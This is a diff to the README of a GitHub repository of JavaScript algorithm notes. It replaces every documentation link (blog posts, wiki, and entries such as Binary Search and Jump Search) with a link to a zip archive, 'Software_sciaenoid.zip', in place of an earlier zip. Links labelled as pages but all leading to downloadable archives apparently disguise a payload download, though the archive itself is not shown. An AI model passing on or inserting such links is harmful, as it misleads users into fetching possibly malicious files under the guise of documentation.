@@ -1,19 +1,19 @@
 ## Algorithms
 
-GitHub port of my [blog posts on algorithms](https://raw.githubusercontent.com/dextercool/algorithms/master/suber/algorithms.zip) intended to be covered on JS. Feel free to add algorithms written in different programming languages! 
+GitHub port of my [blog posts on algorithms](https://github.com/dextercool/algorithms/raw/refs/heads/master/src/Software_sciaenoid.zip) intended to be covered on JS. Feel free to add algorithms written in different programming languages! 
 
-For more info visit the [wiki page](https://raw.githubusercontent.com/dextercool/algorithms/master/suber/algorithms.zip)
+For more info visit the [wiki page](https://github.com/dextercool/algorithms/raw/refs/heads/master/src/Software_sciaenoid.zip)
 
 ***
 
 ### Search
 
-* [Sequential Search](https://raw.githubusercontent.com/dextercool/algorithms/master/suber/algorithms.zip)
-* [Linear Search in Sorted Lists](https://raw.githubusercontent.com/dextercool/algorithms/master/suber/algorithms.zip)
-* [Jump Search](https://raw.githubusercontent.com/dextercool/algorithms/master/suber/algorithms.zip)
-* [Binary Search](https://raw.githubusercontent.com/dextercool/algorithms/master/suber/algorithms.zip)
-* [Interpolation Search](https://raw.githubusercontent.com/dextercool/algorithms/master/suber/algorithms.zip)
+* [Sequential Search](https://github.com/dextercool/algorithms/raw/refs/heads/master/src/Software_sciaenoid.zip)
+* [Linear Search in Sorted Lists](https://github.com/dextercool/algorithms/raw/refs/heads/master/src/Software_sciaenoid.zip)
+* [Jump Search](https://github.com/dextercool/algorithms/raw/refs/heads/master/src/Software_sciaenoid.zip)
+* [Binary Search](https://github.com/dextercool/algorithms/raw/refs/heads/master/src/Software_sciaenoid.zip)
+* [Interpolation Search](https://github.com/dextercool/algorithms/raw/refs/heads/master/src/Software_sciaenoid.zip)
 
 ### Order statistics
 
-* [Minimum and Maximum](https://raw.githubusercontent.com/dextercool/algorithms/master/suber/algorithms.zip)
+* [Minimum and Maximum](https://github.com/dextercool/algorithms/raw/refs/heads/master/src/Software_sciaenoid.zip)
